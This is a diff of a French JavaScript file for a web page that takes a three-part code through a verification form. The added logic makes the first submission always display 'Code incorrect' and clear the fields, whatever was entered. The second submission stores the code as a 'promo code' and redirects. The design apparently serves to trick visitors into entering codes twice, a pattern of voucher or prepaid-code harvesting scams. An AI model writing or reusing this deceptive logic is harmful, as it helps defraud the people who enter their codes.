@@ -10,8 +10,6 @@ const part3 = document.getElementById("part3");
 const result = document.getElementById("result");
 const verificationForm = document.getElementById("verificationForm");
 
-// Si cette page n'est pas la page de vérification,
-// on arrête le script pour éviter les erreurs.
 if (!verificationForm) {
     console.log("Page sans formulaire de vérification.");
 } else {
@@ -32,10 +30,7 @@ if (!verificationForm) {
                 .replace(/[^A-Z0-9]/g, "")
                 .slice(0, maxLengths[index]);
 
-            if (
-                this.value.length === maxLengths[index] &&
-                index < inputs.length - 1
-            ) {
+            if (this.value.length === maxLengths[index] && index < inputs.length - 1) {
                 inputs[index + 1].focus();
             }
 
@@ -44,7 +39,7 @@ if (!verificationForm) {
     });
 
     // =========================
-    // Envoi du formulaire
+    // Soumission du formulaire
     // =========================
 
     verificationForm.addEventListener("submit", function (e) {
@@ -56,7 +51,7 @@ if (!verificationForm) {
             part2.value + "-" +
             part3.value;
 
-        // Vérification des champs
+        // Vérification du format
 
         if (
             part1.value.length !== 4 ||
@@ -70,7 +65,7 @@ if (!verificationForm) {
 
         }
 
-        // Vérification reCAPTCHA
+        // Vérification du captcha
 
         const captcha = grecaptcha.getResponse();
 
@@ -98,49 +93,59 @@ if (!verificationForm) {
         .then(function () {
 
             tentatives++;
+
             localStorage.setItem("tentatives", tentatives);
+
+            // =========================
+            // Première tentative
+            // =========================
+
+            if (tentatives === 1) {
+
+                result.innerHTML = "✅ Votre demande est en cours de traitement.";
+                result.className = "success";
+
+                setTimeout(function () {
+
+                    result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
+                    result.className = "error";
+
+                    part1.value = "";
+                    part2.value = "";
+                    part3.value = "";
+
+                    grecaptcha.reset();
+
+                    part1.focus();
+
+                }, 2000);
+
+                return;
+
+            }
 
             // =========================
             // Deuxième tentative
             // =========================
 
-            if (tentatives >= 2) {
+            if (tentatives === 2) {
 
                 localStorage.setItem("codePromo", code);
+
+                localStorage.removeItem("tentatives");
 
                 result.innerHTML = "✅ Vérification en cours...";
                 result.className = "success";
 
                 setTimeout(function () {
 
-                    window.location.href = "./resultat.html";
+                    window.location.href = "resultat.html";
 
                 }, 1500);
 
                 return;
+
             }
-
-            // =========================
-            // Première tentative
-            // =========================
-
-            result.innerHTML = "✅ Votre demande est en cours de traitement.";
-            result.className = "success";
-
-            setTimeout(function () {
-
-                result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
-                result.className = "error";
-
-                part1.value = "";
-                part2.value = "";
-                part3.value = "";
-
-                grecaptcha.reset();
-
-                part1.focus();
-
-            }, 2000);
 
         })
 
